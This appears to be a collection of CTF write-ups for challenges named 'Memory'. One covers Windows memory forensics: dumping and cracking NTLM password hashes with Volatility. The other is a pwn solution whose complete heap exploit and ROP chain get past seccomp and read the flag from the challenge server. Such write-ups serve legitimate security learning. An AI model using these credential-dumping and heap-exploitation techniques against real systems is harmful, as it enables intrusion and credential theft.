# Memory

## Problem description  
Flag is: FwordCTF{computername_user_password}

Link to zip: http://download.fword.wtf/foren.7z

**Category: Forensics**

## Personal note  
This was the first time I attempted a forensics challenge. It was the first
time I used volatility, which seemed to be a really good tool for this type of
challenge. Through working on the challenge, I learned a lot about types of
information we can discover by memory image analysis.

## Concepts  
* [Memory forensics](https://en.wikipedia.org/wiki/Memory_forensics)  
* [Windows registry](https://en.wikipedia.org/wiki/Windows_Registry)

## Tools  
* [Volatility](https://www.volatilityfoundation.org/releases)

## Other resources  
I used the following tutorials to find the relevant info:  
* https://www.aldeid.com/wiki/Volatility/Retrieve-hostname  
* https://www.aldeid.com/wiki/Volatility/Retrieve-password  
* https://www.andreafortuna.org/2017/07/03/volatility-my-own-cheatsheet-part-2-processes-and-dlls/ (some info about envars)

## Solution  
First I downloaded the zip file and extracted it:  
`$ 7z e foren.7z`

This extracts the file called `foren.raw`.

The extracted file is 2GB.

I execute `$ file foren.raw` to look for some clues as to the file type, but
it only returns the generic `data` type (gives no hint as to the type of the
file).

Next step is to try `$ strings foren.raw | head -200 | less`, to look at the first printable strings in the file. There are a few strings related to VMWare and a lot of strings related to Microsoft Windows. Since this is a forensics challenge called memory, I suspect this might be some type of memory image file. The problem description suggests the type of information we want to get from the file (computername, user, password).

Googling, I find that volatility is good for analyzing memory files, so I
download and install it on my machine.

### Get general information

Now volatility can be used to get some information about the file:  
```  
$ volatility -f foren.raw imageinfo  
```

Relevant output:  
```  
Volatility Foundation Volatility Framework 2.6  
INFO    : volatility.debug    : Determining profile based on KDBG search...  
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64,
Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418  
AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)  
AS Layer2 : FileAddressSpace (/home/jeanette/Downloads/foren.raw)  
```

So it seems to be memory from Windows 7 that has been written to the file.

Now that we know the (likely) profile, we can try to get more information
needed for the flag. If we get information about the virtual address of
certain windows registry hives (i.e., branches of the windows registry that
are stored in files), we can use this information to solve the tasks of
getting the computer name, username, and password.

To get information about the computer name, we need information about
`REGISTRY\MACHINE\SYSTEM`.  
To get username and password hashes, we need information about
`REGISTRY\MACHINE\SYSTEM` and `\SystemRoot\System32\Config\SAM`.

Command to get registry hive information:  
```  
$ volatility -f foren.raw --profile=Win7SP1x64 hivelist  
```

Selected output:  
```  
Volatility Foundation Volatility Framework 2.6  
Virtual            Physical           Name  
------------------ ------------------ ----  
0xfffff8a0014da410 0x00000000275c0410 \SystemRoot\System32\Config\SAM  
0xfffff8a000024010 0x000000002d07a010 \REGISTRY\MACHINE\SYSTEM  
```

### Get computer name  
To get the computer name, we can use the following command (the -o argument is
a reference to the virtual address of \REGISTRY\MACHINE\SYSTEM):  
```  
$ volatility -f foren.raw --profile=Win7SP1x64 printkey -o 0xfffff8a000024010
-K 'ControlSet001\Control\ComputerName\ComputerName'  
```

Selected output:  
```  
REG_SZ        ComputerName    : (S) FORENWARMUP*  
```

So now we know that the computer name needed for the flag is `FORENWARMUP`.

### Get username and password  
To get the username and password hashes, we can use the following command (the
-y argument is a reference to the virtual address of \REGISTRY\MACHINE\SYSTEM,
the -s argument is a reference to the virtual address of
\SystemRoot\System32\Config\SAM):  
```  
$ volatility -f foren.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010
-s 0xfffff8a0014da410  
```

This command results in the following output (the username is at the start of
each row, and the hash is at the end of each row [before the three last
':'-separators]):  
```  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
fwordCTF:1000:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::  
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:514fab8ac8174851bfc79d9a205a939f:::  
SBA_AK:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::  
```

At first I thought fwordCTF was the user needed for the flag, but looking at
the list of process environment variables suggests that it is another user
that is using the system:  
```  
$ volatility -f foren.raw --profile=Win7SP1x64 envars | grep 'C:\\Users'  
```

Selected output:  
```  
Volatility Foundation Volatility Framework 2.6  
Pid      Process              Block              Variable
Value  
-------- -------------------- ------------------ ------------------------------ -----  
2516 chrome.exe           0x0000000000a31320 USERPROFILE
C:\Users\SBA_AK  
3992 chrome.exe           0x0000000000931320 APPDATA
C:\Users\SBA_AK\AppData\Roaming  
3992 chrome.exe           0x0000000000931320 LOCALAPPDATA
C:\Users\SBA_AK\AppData\Local  
```

So, it seems that the user needed for the flag is `SBA_AK`.

Next, we can use the hash to get the password from the site
[crackstation](https://crackstation.net/).  
Crackstation uses a pre-computed lookup table to crack password hashes,
storing a mapping from hash to password.  
Thus, if the hash is mapped to the password in the lookup table, it is very
quick to find the password.

From the crackstation website, we can enter the hash
`a9fdfa038c4b75ebc76dc855dd74f0da`, and click the 'Crack Hashes' button, and
the password is found:

```  
Hash                                Type        Result  
a9fdfa038c4b75ebc76dc855dd74f0da        NTLM    password123  
```

Thus, the password needed for the flag is `password123`.

### Flag

Now, we can construct the flag, following the format given in the challenge
description: \  
`FwordCTF{computername_user_password}`

Inserting the computername, user, and password, we finally know the flag: \  
`FwordCTF{FORENWARMUP_SBA_AK_password123}`  

Original writeup (https://github.com/jeanettesa/ctf-
writeups/blob/master/2020/FwordCTF/memory/memory.md).session.upload_progress + leak_tmpfile + ld_preload  

Original writeup (https://github.com/NGA99/CTF/tree/main/IJCTF/memory).https://scavengersecurity.com/posts/memory/

Original writeup (https://scavengersecurity.com/posts/memory/).## Memory

> Points: 944  
>  
> Solves: 26

### Description:  
> Memory is love!  
>  
> nc 20.216.39.14 1235  
>  
> https://drive.google.com/file/d/1_ZZmFWxE3SHuezNz9nOirl3RNNbgCHzF/view

### Attachments:  
> -rwxr-xr-x 1 mito mito  2029560 Apr 10 01:14 libc.so.6      --> libc-2.31.so  
>  
> -rwxrwxr-x 1 mito mito    17648 Apr  3 23:03 memory

### C code:  
Below is the result of decompiling the `main` function using `Ghidra`.  
```c  
void main(void)

{  
 undefined4 uVar1;  
  
 count = (undefined4 *)malloc(4);  
 *count = 0;  
 init_buffering();  
 sandbox();  
 puts("Memory can be easily accessed !");  
 do {  
   menu();  
   printf(">> ");  
   uVar1 = read_int();  
   switch(uVar1) {  
   case 1:  
     dread();  
     break;  
   case 2:  
     dwrite();  
     break;  
   case 3:  
     dallocate();  
     break;  
   case 4:  
     dfree();  
     break;  
   case 5:  
     dview();  
     break;  
   case 6:  
                   /* WARNING: Subroutine does not return */  
     exit(1);  
   }  
 } while( true );  
}  
```  
## Analysis:  
This binary has the following five functions.  
* `dread()` displays 8 bytes of data at any address.  
* `dwrite()` writes 8 bytes of data to any address.  
* `dallocate()` can malloc a chunk of any size and write malloced size -8 data in the heap. Not terminated with null.  
* `dree()` frees the chunk (the last malloced chunk) pointed to by the `ptr` variable.  
* `dview()` displays the data of the chunk (the last malloced chunk) pointed to by the `ptr` variable.

However, `dread()` and `dwrite()` can only be used once.

First, the `sandbox` function is used to set `seccomp`.  
```c  
void sandbox(void)

{  
 undefined8 uVar1;  
 long in_FS_OFFSET;  
 uint local_34;  
 undefined4 local_28 [6];  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 uVar1 = seccomp_init(0);  
 local_28[0] = 0;  
 local_28[1] = 1;  
 local_28[2] = 2;  
 local_28[3] = 10;  
 local_28[4] = 0xe7;  
 for (local_34 = 0; local_34 < 5; local_34 = local_34 + 1) {  
   seccomp_rule_add(uVar1,0x7fff0000,local_28[(int)local_34],0);  
 }  
 seccomp_load(uVar1);  
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
                   /* WARNING: Subroutine does not return */  
   __stack_chk_fail();  
 }  
 return;  
}  
```

The result of `seccomp-tools` is as follows.

System calls other than `sys_read`, `sys_write`, `sys_open`, `sys_mprotect`,
and `sys_exit_group` are prohibited.

```bash  
$ seccomp-tools dump ./memory  
line  CODE  JT   JF      K  
=================================  
0000: 0x20 0x00 0x00 0x00000004  A = arch  
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011  
0002: 0x20 0x00 0x00 0x00000000  A = sys_number  
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005  
0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011  
0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010  
0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010  
0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010  
0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010  
0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011  
0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW  
0011: 0x06 0x00 0x00 0x00000000  return KILL  
```

The state of the free chunk when the binary (memory) is started is as follows.

We can see that many chunks are free from the beginning.  
```  
pwndbg> bins  
tcachebins  
0x20 [  7]: 0x55555555aff0 —▸ 0x55555555b2a0 —▸ 0x55555555a770 —▸
0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0  
0x70 [  7]: 0x55555555a9b0 —▸ 0x55555555ab50 —▸ 0x55555555acf0 —▸
0x55555555ae90 —▸ 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0  
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸
0x55555555add0 —▸ 0x55555555af70 —▸ 0x55555555b220 —▸ 0x55555555a660 ◂— 0x0  
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸
0x555555559800 —▸ 0x555555559370 ◂— 0x0  
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0  
fastbins  
0x20: 0x55555555a4b0 —▸ 0x55555555a5c0 —▸ 0x55555555a8e0 —▸ 0x55555555a980 —▸
0x55555555ab20 ◂— ...  
0x30: 0x0  
0x40: 0x0  
0x50: 0x0  
0x60: 0x0  
0x70: 0x55555555b2b0 —▸ 0x55555555a4d0 —▸ 0x55555555a5e0 —▸ 0x55555555a7f0 —▸
0x55555555aef0 ◂— ...  
0x80: 0x55555555a540 —▸ 0x55555555a860 ◂— 0x0  
unsortedbin  
all: 0x0  
smallbins  
empty  
largebins  
empty  
pwndbg>  
```

The `BSS` area is as follows. Only `count` and `ptr` variables.  
```  
pwndbg> x/80gx 0x555555558000  
0x555555558000: 0x0000000000000000      0x0000555555558008  
0x555555558010: 0x0000000000000000      0x0000000000000000  
0x555555558020 <stdout@@GLIBC_2.2.5>:   0x00007ffff7f8c6a0
0x0000000000000000  
0x555555558030 <stdin@@GLIBC_2.2.5>:    0x00007ffff7f8b980
0x0000000000000000  
0x555555558040 <stderr@@GLIBC_2.2.5>:   0x00007ffff7f8c5c0
0x0000000000000000  
0x555555558050 <count>: 0x00005555555592a0      0x000055555555b330　　　<-
ptr変数(0x000055555555b330)  
0x555555558060: 0x0000000000000000      0x0000000000000000  
0x555555558070: 0x0000000000000000      0x0000000000000000  
```

## Solution:  
The points of Exploit are as follows.

* Heap address leaks are easy because they are not null-terminated with `dallocate()`.  
* We can easily get the libc address and rewrite the `__free_hook` by using `dwrite()` to replace the link in the `tcachebins`.  
* The `system` function cannot be used because the system call is restricted by `seccomp`.  
* We can use ROP by stacking heap memory using the the ROP gadget of `mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];` and the `setcontext` function.

The following is a brief description of the Exploit procedure.

For heap address leaks, we can `dallocate()` a 0x10 size chunk, write only
"\n" as data, and then call the `dview()` function to leak the top 7 bytes of
the heap address.  
```bash  
$ ./memory  
Memory can be easily accessed !  
1) read  
2) write  
3) allocate  
4) free  
5) view  
6) exit  
>> 3  
size:  
>> 16  
data:  
>>  
1) read  
2) write  
3) allocate  
4) free  
5) view  
6) exit  
>> 5

�UUUU　　<- Heap address leak  
```

The state of the first `tcachebins` is as follows.  
```  
pwndbg> bins  
tcachebins  
0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸
0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0  
0x70 [  7]: 0x55555555a9b0 —▸ 0x55555555ab50 —▸ 0x55555555acf0 —▸
0x55555555ae90 —▸ 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0  
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸
0x55555555add0 —▸ 0x55555555af70 —▸ 0x55555555b220 —▸ 0x55555555a660 ◂— 0x0  
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸
0x555555559800 —▸ 0x555555559370 ◂— 0x0  
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0  
```

Use `dwrite()` to change the 0xf0 `tcachebin` free chunk from `0x55555555a390`
to `0x55555555aef0`.  
```  
State before change：0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0  
　　　　　　　　　　　　　　　  
State after change： 0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0  
```

The state of the heap memory after the change is as follows.  
```  
0x55555555b070: 0x000055555555b1b0      0x000055555555ae90  
0x55555555b080: 0x0000000000000000      0x0000000000000000  
0x55555555b090: 0x0000000000000000      0x00000000000000f1  
0x55555555b0a0: 0x000055555555aef0      0x0000555555559010  
　　　　　　 　　~~~~~~~~~~~~~~~~~~　　  
0x55555555b0b0: 0x0000000000000000      0x0000000000000000  
0x55555555b0c0: 0x0000000000000000      0x0000000000000000  
0x55555555b0d0: 0x0000000000000001      0x0000000000000035  
0x55555555b0e0: 0x0000000000000000      0x0000000000000000  
```

The memory status near `0x000055555555aef0` is as follows.  
```  
0x55555555ae70: 0x000055555555acc0      0x000055555555b000  
0x55555555ae80: 0x0000000000000020      0x0000000000000070  
0x55555555ae90: 0x000055555555b030      0x0000555555559010  
0x55555555aea0: 0xffffffff00000000      0xffffffff00000000  
0x55555555aeb0: 0x000100010000ffff      0x0000000000000000  
0x55555555aec0: 0x00000000fd929108      0x0000000000000000  
0x55555555aed0: 0x000055555555b030      0x000055555555acf0  
0x55555555aee0: 0x0000000000000000      0x0000000000000000　--> Write 0xf1 to
create a fake chunk.  
0x55555555aef0: 0x0000000000000000      0x0000000000000071　--> Leak the libc
address (0x00007ffff7f8bc40) of this chunk.  
0x55555555af00: 0x00007ffff7f8bc40      0x000055555555ad50  
0x55555555af10: 0xffffffffffffffff      0xffffffffffffffff  
0x55555555af20: 0x0000000100000000      0x0000000000000000  
0x55555555af30: 0x0000000093507296      0x0000000000000000  
0x55555555af40: 0x0000000000000000      0x0000000000000000  
0x55555555af50: 0x0000000000000000      0x0000000000000000  
0x55555555af60: 0x0000000000000070      0x0000000000000080  --> Rewrite this
0x80 size chunk and rewrite __free_hook.  
0x55555555af70: 0x000055555555b220      0x0000555555559010  
0x55555555af80: 0x0000000000000003      0x0000000000000000  
0x55555555af90: 0x0000000000000003      0x0000000000000000  
0x55555555afa0: 0x0000000000000001      0x0000000000000000  
0x55555555afb0: 0x0000000000000000      0x0000000000000000  
0x55555555afc0: 0x0000000000000000      0x0000000000000000  
0x55555555afd0: 0x0000000000000000      0x0000000000000000  
0x55555555afe0: 0x0000000000000000      0x0000000000000021  
0x55555555aff0: 0x000055555555b20a      0x0000000000000000  
```

We can get the libc address (`0x00007ffff7f8bc40`) by executing the following.  
```python  
Alloc(0xe0, "\n")  
Alloc(0xe0, "A"*15+"\n")  
View()  
```  
```  
0x55555555aed0: 0x0000000000000000      0x0000000000000000  
0x55555555aee0: 0x0000000000000000      0x00000000000000f1  
0x55555555aef0: 0x4141414141414141      0x0a41414141414141  
0x55555555af00: 0x00007ffff7f8bc40      0x000055555555ad50  
               ~~~~~~~~~~~~~~~~~~  
0x55555555af10: 0xffffffffffffffff      0xffffffffffffffff  
0x55555555af20: 0x0000000100000000      0x0000000000000000  
0x55555555af30: 0x0000000093507296      0x0000000000000000  
0x55555555af40: 0x0000000000000000      0x0000000000000000  
0x55555555af50: 0x0000000000000000      0x0000000000000000  
0x55555555af60: 0x0000000000000070      0x0000000000000080  
0x55555555af70: 0x000055555555b220      0x0000555555559010  
0x55555555af80: 0x0000000000000003      0x0000000000000000  
```

We can write the data of (`free_hook-0x10`) to the 0x80 size `tcachebins` by
executing the following.  
```python  
Free()  
Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))  
```  
The state where the address of `__free_hook` is written to `tcachebins` is as
follows.  
```  
pwndbg> bins  
tcachebins  
0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸
0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0  
0x70 [  3]: 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0  
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸
0x55555555add0 —▸ 0x55555555af70 —▸ 0x7ffff7f8de38 (__attr_list_lock) ◂— 0x0  
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸
0x555555559800 —▸ 0x555555559370 ◂— 0x0  
```

The `system` function cannot be used because the system call is restricted by
`seccomp`. Therefore, it needs to be ROP, but since the register used by the
`setcontext` function has been changed to `rdx` in libc-2.31.so, the
`setcontext` function cannot be used directly.

The following is an excerpt from the `setcontext` function.  
```  
  0x00007ffff7df3f8d <+61>:     mov    rsp,QWORD PTR [rdx+0xa0]  
  0x00007ffff7df3f94 <+68>:     mov    rbx,QWORD PTR [rdx+0x80]  
  0x00007ffff7df3f9b <+75>:     mov    rbp,QWORD PTR [rdx+0x78]  
  0x00007ffff7df3f9f <+79>:     mov    r12,QWORD PTR [rdx+0x48]  
  0x00007ffff7df3fa3 <+83>:     mov    r13,QWORD PTR [rdx+0x50]  
  0x00007ffff7df3fa7 <+87>:     mov    r14,QWORD PTR [rdx+0x58]  
  0x00007ffff7df3fab <+91>:     mov    r15,QWORD PTR [rdx+0x60]  
  0x00007ffff7df3faf <+95>:     test   DWORD PTR fs:0x48,0x2  
  0x00007ffff7df3fbb <+107>:    je     0x7ffff7df4076 <setcontext+294>  
```

I searched for other `push rdi; ...; pop rsp; ...; ret;` ROP gadgets, but none
were available.

When I checked the following site, I was able to use ROP because I could set
the address of the heap in the `rsp` register by using the ROP gadget of `mov
rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx +
0x20];` and the `setcontext` function.

[https://lkmidas.github.io/posts/20210103-heap-seccomp-
rop/](http://lkmidas.github.io/posts/20210103-heap-seccomp-rop/)

In ROP, we can read the flag file by `sys_open` the `./flag.txt` file and
system-calling `sys_read` and `sys_write` in that order.

The following is the state where the address of `mov rdx, qword ptr [rdi + 8];
...` is set in `__free_hook`.  
```  
0x7ffff7f8de30 <fork_handlers+1552>:    0x0000000000000000
0x0000000000000000  
0x7ffff7f8de40 <__after_morecore_hook>: 0x000055555555b2c0
0x00007ffff7ef08b0  
```

The following is the state where the ROP code is written in the heap area.  
```  
0x55555555b290: 0x0000000000000000      0x0000000000000021  
0x55555555b2a0: 0x000055555555a770      0x0000555555559010  
0x55555555b2b0: 0x0000000000000001      0x0000000000000211  
0x55555555b2c0: 0x4141414141414141      0x4141414141414141  
0x55555555b2d0: 0x4141414141414141      0x4141414141414141  
0x55555555b2e0: 0x00007ffff7df3f8d      0x4242424242424242  
0x55555555b2f0: 0x4242424242424242      0x4242424242424242  
0x55555555b300: 0x4242424242424242      0x4242424242424242  
0x55555555b310: 0x4242424242424242      0x4242424242424242  
0x55555555b320: 0x4242424242424242      0x4242424242424242  
0x55555555b330: 0x4242424242424242      0x4242424242424242  
0x55555555b340: 0x4242424242424242      0x4242424242424242  
0x55555555b350: 0x4242424242424242      0x4242424242424242  
0x55555555b360: 0x000055555555b370      0x00007ffff7dc1679  
0x55555555b370: 0x00007ffff7de6400      0x0000000000000002  
0x55555555b380: 0x00007ffff7dc2b72      0x000055555555b418  
0x55555555b390: 0x00007ffff7dc504f      0x0000000000000000  
0x55555555b3a0: 0x00007ffff7e020d9      0x00007ffff7dc2b72  
0x55555555b3b0: 0x0000000000000000      0x00007ffff7e90b95  
0x55555555b3c0: 0x00007ffff7dc504f      0x000055555555d000  
0x55555555b3d0: 0x00007ffff7eb8241      0x0000000000000080  
0x55555555b3e0: 0x0000000000000000      0x00007ffff7e020d9  
0x55555555b3f0: 0x00007ffff7de6400      0x0000000000000001  
0x55555555b400: 0x00007ffff7dc2b72      0x0000000000000001  
0x55555555b410: 0x00007ffff7e020d9      0x742e67616c662f2e  
0x55555555b420: 0x0000000000007478      0x0000000000000000  
0x55555555b430: 0x0000000000000000      0x0000000000000000  
```

## Exploit code:  
The Exploit code is below.  
```python  
from pwn import *

context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = './memory'  
context.binary = elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':  
 HOST = "20.216.39.14"  
 PORT = 1235  
 s = remote(HOST, PORT)  
 libc = ELF("./libc.so.6")  
else:  
 s = process(BINARY)  
 #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})  
 libc = elf.libc  
  
def Read(where):  
 s.sendlineafter(">> ", "1")  
 s.sendlineafter(">> ", hex(where))

def Write(where, data):  
 s.sendlineafter(">> ", "2")  
 s.sendlineafter(">> ", hex(where))  
 s.sendlineafter(">> ", hex(data))  
  
def Alloc(size, data):  
 s.sendlineafter(">> ", "3")  
 s.sendlineafter(">> ", str(size))  
 s.sendafter(">> ", data)  
  
def Free():  
 s.sendlineafter(">> ", "4")

def View():  
 s.sendlineafter(">> ", "5")

Alloc(0x10, "\n")  
View()  
heap_leak = u64(s.recv(6)+b"\x00\x00")  
heap_base = heap_leak - 0x220a  
print("heap_leak =", hex(heap_leak))  
print("heap_base =", hex(heap_base))

Alloc(1100, "A"*4)  
Free()  
Write(heap_base+0x20a0, heap_base+0x1ef0)

# Make 0xf0 size chunk for free()  
Alloc(0x60, "\n")  
Alloc(0x60, "\n")  
Alloc(0x60, "\n")  
Alloc(0x68, p64(0)*11+p64(0xf1))

# libc leak  
Alloc(0xe0, "\n")  
Alloc(0xe0, "A"*15+"\n")  
View()  
s.recvuntil("A"*15+"\n")  
libc_leak = u64(s.recv(6)+b"\x00\x00")  
libc_base = libc_leak - 0x1ecc40  
free_hook = libc_base + libc.sym.__free_hook

print("libc_leak =", hex(libc_leak))  
print("libc_base =", hex(libc_base))

setcontext   = libc_base + libc.sym.setcontext  
mov_rdx_rdi  = libc_base + 0x1518b0 # mov rdx, qword ptr [rdi + 8]; mov qword
ptr [rsp], rax; call qword ptr [rdx + 0x20];  
ret_addr     = libc_base + 0x22679  # ret;  
syscall_ret  = libc_base + 0x630d9  # syscall; ret;  
pop_rax_ret  = libc_base + 0x47400  # pop rax; ret;  
pop_rdi_ret  = libc_base + 0x23b72  # pop rdi; ret;  
pop_rsi_ret  = libc_base + 0x2604f  # pop rsi; ret;  
pop_rdx_ret  = libc_base + 0x119241 # pop rdx; pop r12; ret;  
xchg_eax_edi = libc_base + 0xf1b95  # xchg eax, edi; ret;

# Write __free_hook in tcachebins  
Free()  
Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))

for i in range(5):  
 Alloc(0x70, "\n")

# Write ROP chain of Open/Read/Write in heap memory  
buf  = b"A"*0x20  
buf += p64(setcontext+61)  
buf += b"B"*0x78  
buf += p64(heap_base + 0x2370) # rsp  
buf += p64(ret_addr)           # rcx  
buf += p64(pop_rax_ret)  
buf += p64(2)  
buf += p64(pop_rdi_ret)  
buf += p64(heap_base + 0x2418)  
buf += p64(pop_rsi_ret)  
buf += p64(0)  
buf += p64(syscall_ret)  
buf += p64(pop_rdi_ret)  
buf += p64(0)  
buf += p64(xchg_eax_edi)  
buf += p64(pop_rsi_ret)  
buf += p64(heap_base + 0x4000)  
buf += p64(pop_rdx_ret)  
buf += p64(0x80)  
buf += p64(0)  
buf += p64(syscall_ret)  
buf += p64(pop_rax_ret)  
buf += p64(1)  
buf += p64(pop_rdi_ret)  
buf += p64(1)  
buf += p64(syscall_ret)  
buf += b"./flag.txt\x00"  
Alloc(0x200, buf)

# Write ROP gadget address(mov rdx, qword ptr [rdi + 8];...) in __free_hook  
Alloc(0x70, p64(0)+p64(heap_base+0x22c0)+p64(mov_rdx_rdi))

# Start ROP chain  
Free()

s.interactive()  
```

## Results:  
The execution result is as follows.  
```bash  
mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Memory$ python3 solve.py r  
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/memory'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to 20.216.39.14 on port 1235: Done  
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
heap_leak = 0x564b41f2020a  
heap_base = 0x564b41f1e000  
libc_leak = 0x7f131dcb4c40  
libc_base = 0x7f131dac8000  
[*] Switching to interactive mode  
Securinets{397b5541d6dacf89123c5a24eea45cb7cc526dade67d4a70}  
```

## Reference:  
References are below. Thank you, Midas!

[https://lkmidas.github.io/posts/20210103-heap-seccomp-
rop/](http://lkmidas.github.io/posts/20210103-heap-seccomp-rop/)  

Original writeup
(https://github.com/mito753/CTF/blob/main/2022/Securinets_CTF_Quals_2022/Pwn_Memory/).